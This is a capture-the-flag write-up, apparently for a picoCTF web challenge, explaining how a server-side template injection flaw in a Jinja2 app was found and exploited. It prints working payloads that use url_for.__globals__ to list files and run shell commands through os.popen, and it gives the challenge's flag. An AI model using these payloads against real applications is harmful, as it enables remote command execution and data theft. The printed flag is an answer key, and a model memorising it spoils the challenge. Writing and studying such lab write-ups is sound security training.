# SSTI1 - Server Side Template Injection Basic

## Challenge Information
- **Category:** Web Exploitation
- **Points:** Forgot
- **Description:** I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps!
- **Hint:** Server Side Template Injection

## Initial Analysis
The challenge presents a web application that processes user input through templates. Initial testing revealed:
- `${7*7}` - Returns the literal string, suggesting not vulnerable to certain template engines
- `{{7*7}}` - Returns `49`, confirming template injection is possible
- `{{7*'7'}}` - Returns `7777777`, suggesting Python-like string multiplication

This behavior strongly indicates the use of a Jinja2, Twig, or other similar Python-based template engine.


## Vulnerability Overview
The application is vulnerable to Server Side Template Injection (SSTI) through the use of the `{{}}` syntax, which is commonly associated with Jinja2 templates in Python web applications.

## Exploitation Steps

1. **Basic Injection Test:**  
   `{{7*7}}` confirms code execution by returning `49`.

2. **String Operation Test:**  
   `{{7*'7'}}` demonstrates Python string multiplication by returning `7777777`.

3. **Directory Listing:**  
   `{{ url_for.__globals__['os'].listdir('.') }}` retrieves current directory files, returning:
   - `app.py`
   - `__pycache__`
   - `flag`
   - `requirements.txt`

4. **Payload Explanation:**  
   The payload accesses the template's global namespace to leverage the Python os module. This enables listing the directory and verifying access to key files.

5. **Flag Extraction:**  
   Executing `{{ url_for.__globals__['os'].popen('cat flag').read() }}` reads and returns:
   `picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_3066c7bd}`

## Solution
The exploitation chain demonstrates that the SSTI vulnerability can be used to access sensitive system files, culminating in flag extraction. Further object traversal may lead to more severe system compromises.

## Flag
```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_3066c7bd}
```

## Additional Notes
- The successful execution of `{{7*7}}` confirms code execution within the template
- The string multiplication behavior (`{{7*'7'}}`) specifically points to Python's template engine
- Next steps should focus on exploring object traversal to access system functionality

## References
- [PayloadsAllTheThings SSTI Guide](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/)